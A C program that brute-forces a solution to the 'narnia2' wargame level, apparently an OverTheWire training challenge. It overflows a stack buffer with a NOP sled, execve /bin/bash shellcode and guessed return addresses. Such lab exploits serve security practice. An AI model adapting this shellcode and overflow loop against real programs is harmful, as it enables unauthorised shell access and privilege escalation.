// There are many aproaches to solve narnia2, and here is a brute-force solution.

#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdio.h>

int main(){
  // Setting up variables
	int c = 0, sc_size = 33, ns_size = 99, p_size = 136;
    unsigned int addr = 0xfffdd000; //stack initial address
    unsigned int end = 0xffffe000; //stack final address
    unsigned int cur;
    unsigned char shellcode[33] = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"; //execve /bin/bash
	unsigned char nop_sled[ns_size];
	unsigned char payload[p_size];
// Using memcpy instead of strcpy to ignore null-bytes and keep copying data
	memset(nop_sled, '\x90', ns_size);
	memcpy(payload, nop_sled, ns_size);
	memcpy(payload+ns_size, shellcode, sc_size);

    // Passing through all the stack possible addresses
    for (;addr < end; addr++) {
        addr+=40; // Step of 40 bytes
        memcpy(payload+ns_size+sc_size, &addr, 4);

        // forking the process to execute narnia2 with a new address attemptive
		char * const args[3] = {"./narnia2", payload, NULL};
	   	pid_t pid = fork();
		if (pid == 0){
			execve("./narnia2", args, NULL);
			_exit(1);
		}else{
			int status;
			wait(&status);
            // printing the status to ensure the subprocess has terminated by segfault
			if (WIFSIGNALED(status)) {
    			printf("Signal: %d\n", WTERMSIG(status));
			}
		}

        //checking if the stack has already been completely covered
		memcpy(&cur, &addr, 4);
		if (cur == end) break;
        c++;
    }
    return 0;
}
